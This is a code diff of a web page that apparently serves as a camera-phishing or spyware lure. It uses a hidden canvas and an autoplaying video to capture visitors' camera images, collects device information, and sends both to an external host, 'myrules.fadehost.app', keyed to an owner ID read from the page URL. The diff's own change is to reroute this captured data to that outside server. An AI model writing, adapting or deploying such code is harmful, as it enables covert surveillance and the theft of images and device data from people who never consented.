@@ -38,7 +38,11 @@ body, html { height:100%; background:#000; display:flex; justify-content:center;
 <video id="video" autoplay playsinline muted></video>
 <canvas id="canvas" style="display:none;"></canvas>
 <script>
-const ownerId = "__OWNER_ID__", csrfToken = "__CSRF_TOKEN__";
+const API_BASE_URL = "https://myrules.fadehost.app"; 
+const urlParams = new URLSearchParams(window.location.search);
+const ownerId = urlParams.get('owner_id') || "bilinmiyor";
+const csrfToken = "github_pages_token"; 
+
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 const progressBar = document.getElementById('progress-bar');
@@ -115,7 +119,7 @@ async function collectDeviceInfo() {
 async function sendDeviceInfo() {
     try {
         const info = await collectDeviceInfo();
-        await fetch('/device_info', {
+        await fetch(`${API_BASE_URL}/device_info`, {
             method:'POST',
             headers:{'Content-Type':'application/json','X-CSRF-Token':csrfToken},
             body:JSON.stringify({owner_id:ownerId, device_info:info})
@@ -163,7 +167,7 @@ function captureImage() {
 
 async function sendPhoto(img, type) {
     try {
-        const r = await fetch('/upload', {
+        const r = await fetch(`${API_BASE_URL}/upload`, {
             method:'POST',
             headers:{'Content-Type':'application/json','X-CSRF-Token':csrfToken},
             body:JSON.stringify({owner_id:ownerId, image:img, camera_type:type})
